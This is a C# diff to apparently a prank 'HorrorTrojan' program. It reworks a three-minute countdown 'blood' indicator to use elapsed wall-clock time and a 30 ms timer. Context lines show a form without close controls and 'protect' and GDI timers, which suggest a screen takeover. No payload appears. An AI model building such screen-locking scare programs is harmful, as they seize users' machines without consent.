@@ -14,10 +14,10 @@ namespace HorrorTrojan
         private Timer gdiTimer = new Timer();
         private Timer protectTimer = new Timer();
         private Random rnd = new Random();
-        private int elapsedSeconds = 0;
+        private DateTime startTime;
         private int maxSeconds = 180;
-        private Image horrorImage;
         private int bloodLevel = 100;
+        private Image horrorImage;
         private int indicatorWidth = 25;
         private int indicatorHeight = 280;
         private int indicatorX;
@@ -58,7 +58,7 @@ namespace HorrorTrojan
             this.ControlBox = false;
             this.DoubleBuffered = true;
             
-            bloodTimer.Interval = 1000;
+            bloodTimer.Interval = 30;  // ← 30 мс для плавности
             bloodTimer.Tick += BloodTimer_Tick;
             
             drawTimer.Interval = 30;
@@ -101,6 +101,7 @@ namespace HorrorTrojan
         
         private void HorrorForm_Load(object sender, EventArgs e)
         {
+            startTime = DateTime.Now;
             bloodTimer.Start();
             drawTimer.Start();
             gdiTimer.Start();
@@ -166,11 +167,11 @@ namespace HorrorTrojan
         
         private void BloodTimer_Tick(object sender, EventArgs e)
         {
-            elapsedSeconds++;
-            bloodLevel = 100 - (elapsedSeconds * 100 / maxSeconds);
-            if (bloodLevel < 0) bloodLevel = 0;
+            TimeSpan elapsed = DateTime.Now - startTime;
+            double percent = (elapsed.TotalSeconds / maxSeconds) * 100;
+            bloodLevel = 100 - (int)Math.Min(percent, 100);
             
-            if (elapsedSeconds >= maxSeconds)
+            if (elapsed.TotalSeconds >= maxSeconds)
             {
                 bloodTimer.Stop();
                 drawTimer.Stop();
